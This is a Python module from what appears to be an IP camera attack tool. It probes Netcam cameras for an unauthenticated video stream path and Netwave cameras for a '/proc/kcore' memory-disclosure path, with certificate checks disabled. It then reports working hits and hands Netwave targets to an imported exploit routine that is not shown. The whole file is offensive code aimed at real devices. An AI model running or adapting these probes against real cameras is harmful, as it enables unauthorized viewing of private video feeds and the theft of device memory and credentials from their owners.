#!/usr/bin/env python3  
#-*- coding: utf-8 -*-

from config import INFO, LINE, WARNING
from exploits.netwave import netwaveCam
import requests
import os, sys
import urllib.request
import subprocess
import signal

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


exploits = {
    "Netcam": "anony/mjpg.cgi",
    "Netwave": "/proc/kcore"
}



def check_exploit(camera, url, s):
    print("\n{}Exploit\n".format(INFO))
    for exploit in exploits:
        if camera == exploit and camera in ["Netcam", "Netwave"]:
            print("{}Testing vulnerabilitie {} for {} camera \n".format(INFO, exploits[exploit], exploit))
            url_exploit = "{}{}".format(url, exploits[exploit])
            try:
                req_exploit = requests.head(url_exploit, verify=False, timeout=3, allow_redirects=False)
            except:
                if camera != "Netwave":
                    req_exploit = requests.get(url_exploit, verify=False, timeout=3, allow_redirects=False)
                else:
                    req_exploit = False
            if req_exploit and req_exploit.status_code == 200:
                print("{}The vulnerabilitie worked, go on {}\n".format(WARNING, url_exploit))
            if camera == "Netwave":
                netwave = netwaveCam()
                netwave.exploit_netwave(url_exploit, netwave)
            if camera == "Hikvision":
                pass
    print(LINE)